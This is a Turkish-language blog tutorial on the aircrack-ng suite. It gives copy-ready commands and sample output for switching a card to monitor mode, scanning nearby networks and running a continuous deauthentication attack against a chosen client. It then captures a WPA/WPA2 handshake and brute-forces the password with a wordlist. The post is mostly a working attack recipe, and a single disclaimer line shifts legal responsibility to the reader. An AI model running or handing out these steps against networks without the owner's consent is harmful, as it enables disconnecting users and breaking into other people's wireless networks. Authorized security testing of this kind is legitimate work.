---
title: "Aircrack-ng Kullanımı"
date: "2021-06-28"
coverImage: "./cover.jpg"
category: ["Yazılım"]
---

Aircrack kablosuz ağlara saldırmanıza ve savunmanıza yardımcı olan bir yazılım paketidir. Aircrack tek bir araç değil, her biri belirli bir işlevi yerine getiren bütün bir araçların toplamıdır. Bu araçlar, detector, packet sniffer, WEP/WPA cracker vb. İçerir

### Aircrack-ng ile neler yapabiliriz?

- Ağ trafiğini sezebiliriz.
- Dinlediğimiz ağdan paket yakalayabiliriz.
- Modeme bağlı olan bir aracın modeme bağlanmasını engelleyebiliriz.
- WEP ve WPA/WPA2 şifre kırabiliriz.

> Bu yazı sadece teknik bilgi verme amaçlı hazırlanmıştır. Olabilecek tüm hukiki süreçlerde sorumluluk size aittir !

<h2 id="deauth-attack">Kullanıcıyı internetten düşürme</h2>

1- Aircrack aracını kullanabilmek için öncelikle root olmamız gerekiyor

```bash
sudo su
```

2- Şu anda aktif olan ağ arayüzünün adını ve hangi modda olduğunu öğreniyoruz

```bash
iwconfig
```

```
lo        no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

görüldüğü üzere ağ arayüzümüzün adı **"wlan0"** (sizinki farkı olabilir) ve kart modumuz da **"managed"** mod işte kullanıcıyı internetten koparabilmemiz için ağ kartımızı **"monitor"** moda almamız gerekiyor.

3- Ağ kartını **"monitor"** moda almak

```bash
airmon-ng start wlan0
```

4- Ağ kartımızı **"monitor"** moda geçip geçmediğini tekrar kontrol ediyoruz

```bash
iwconfig
```

```
lo        no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

ağ kartımızı monitor moda aldıktan sonra ağ arayüz isminin sonuna mon eki getirilmiş **"wlan0mon"** (sizde gelmemiş olabilir)

> Ağ kartını monitor moda aldığımızda internet bağlantımız kesilecektir.

5- Şimdi ağ kartımız ile cevreyi taratalım

```bash
airodump-ng wlan0mon
```

```bash
CH 13 ][ Elapsed: 12 s ][ 2021-06-27 21:55

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

A0:E4:CB:A4:21:5F  -77       20        0    0  11  130   WPA  CCMP   PSK  Tuareg
00:1E:45:51:96:01  -88       15        1    0   6   54   WPA  TKIP   PSK  KIZIL

BSSID              STATION            PWR   Rate     Lost   Frames  Notes  Probes

A0:E4:CB:A4:21:5F  52:6C:38:86:21:83  -59    0 - 1e     7        7
A0:E4:CB:A4:21:5F  10:08:C1:03:44:63  -70    0 - 5      0       15
00:1E:45:51:96:01  14:A3:2B:C4:7F:0E   -1   18 - 0      0        1
```

şimdi bu komut etrafınızdaki tüm ağları ve onlara bağlanan kullanıcıların mac adresleri listeliyeceği için çok daha fazla sonuç bulabilir bu yüzden ufak bir filtreleme yapalım yani sadece istediğimiz ağı taratalım.

6- Şimdi ise sadece seçtiğimiz ağı tarayacağız

```bash
airodump-ng -w "wifi adı" -c "kanal numarası" --bssid "mac adresi" "arayüz ismi"
```

```bash
airodump-ng -w Tuareg -c 11 --bssid A0:E4:CB:A4:21:5F wlan0mon
```

```bash
CH 11 ][ Elapsed: 0 s ][ 2021-06-27 22:16

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

A0:E4:CB:A4:21:5F  -77       20        0    0  11  130   WPA  CCMP   PSK  Tuareg

BSSID              STATION            PWR   Rate     Lost   Frames  Notes  Probes

A0:E4:CB:A4:21:5F  52:6C:38:86:21:83  -59    0 - 1e     7        7
A0:E4:CB:A4:21:5F  10:08:C1:03:44:63  -70    0 - 5      0       15
```

şimdi ise filtreleme sonucu bulduğumuz 2 cihazdan birini ağdan düşürelim

7- Ağdan kullanıcıyı düşürme

```bash
aireplay-ng -0 0 -a "ağın mac adresi" -c "hedef mac adresi" "arayüz ismi"
```

```bash
aireplay-ng -0 0 -a A0:E4:CB:A4:21:5F -c 52:6C:38:86:21:83 wlan0mon
```

```bash
22:45:09  Waiting for beacon frame (BSSID: A0:E4:CB:A4:21:5F) on channel 11
22:45:10  Sending 64 directed DeAuth. STMAC: [52:6C:38:86:21:83] [ 0|13 ACKs]
22:45:10  Sending 64 directed DeAuth. STMAC: [52:6C:38:86:21:83] [ 0|21 ACKs]
22:45:11  Sending 64 directed DeAuth. STMAC: [52:6C:38:86:21:83] [ 0|18 ACKs]
22:45:12  Sending 64 directed DeAuth. STMAC: [52:6C:38:86:21:83] [ 0|23 ACKs]
22:45:13  Sending 64 directed DeAuth. STMAC: [52:6C:38:86:21:83] [ 0|21 ACKs]
22:45:13  Sending 64 directed DeAuth. STMAC: [52:6C:38:86:21:83] [ 0|21 ACKs]
```

işte bu kadar :) artık siz saldırıyı durdurana kadar kullanıcı ağa bağlanamaz.

<hr>

## Wifi şifre kırmak (WPA/WPA2)

Wifi kırmak aslında wifiden atma konsusunun devamı niteliğindedir yani bir kullanıcıyı wifiden atmadan wifi şifresini kıramayız peki ya bu ne demek.

Öncelikle şunu bilmemiz gerekiyor Bir cihaz modeme bağlanırken modem ile arasında paketler gidip gelerek bir handshake(el şıkışma) gerçekleşir ve saldırgan bu handshake dosyasını alabilir. İşte bu handshake olayının gerçekleşmesi için kullanıcıyı wifiden kopartma saldırısını başlatıp durduruyoruz çünkü kullanıcı wifiye yeniden bağlansın ve handshake dosyasını yakalayabilelim.

Handshake dosyasını yakaladıktan sonra peki ya şimdi bu dosyayada ne var işte bu dosyada wifi şifresinin şifreli hali var işte bu yüzden çok önemli bir wifiye brute force yapmak aylar hatta yıllar sürebilir çünkü belli yanlış deneme sonrası sitem bizi bloke eder ama biz bu brute force saldırısını modeme değilde yakaladığımız handshake dosyasına yaparsak brute force hızımız kat kat artıcaktır peki ne kadar hızlı 150000 satırlık bir dosyada şifreyi bulması 14 saniye sürebilecek kadar hızlı

hadi o zaman canlı canlı görelim.

1- Öncelikle kullanıcıyı [wifiden koparın](#deauth-attack) ver geri bağlanmasına izin verin

> Kullanıcıyı wifiden atarken sadece dikkat edilmesi gereken yer ağ içinde tarama yaptığınız terminal pencesini durdurmayınız aksi takdirde handshake yakalanmaz

2- Yakaladığımız handshake dosyaları terminali çalıştırdığınız konuma wifi ismiyle kayıt olacaktır

![Yakalanan handshake dosyaları](./handshake.png)

3- handshake dosyasına brute force saldırısı yapıyoruz

```bash
aircrack-ng -w "wordlist" ".cap uzantılı handshake dosyası"
```

```bash
aircrack-ng -w pass_listem.txt Tuareg-01.cap
```

```bash
                               Aircrack-ng 1.6

      [00:00:14] 150000/149999 keys tested (10736.91 k/s)

      Time left: --

                           KEY FOUND! [ akalan123 ]


      Master Key     : 1C B8 0A BC 9A 7B AB 66 6C 0B 7E 48 54 D5 3D 87
                       C4 8F C5 F6 25 55 A2 F0 DB DC 4C 38 21 23 1C 36

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : 4E 6E 59 1A BE 95 79 A2 9D 2D 48 9B 91 2C 3A A8
```

Sonuç 14 saniyede 150000 satırlık dosyada şifremi buldu

sonraki yazılarımda görüşmek üzere esen kalın 👋️
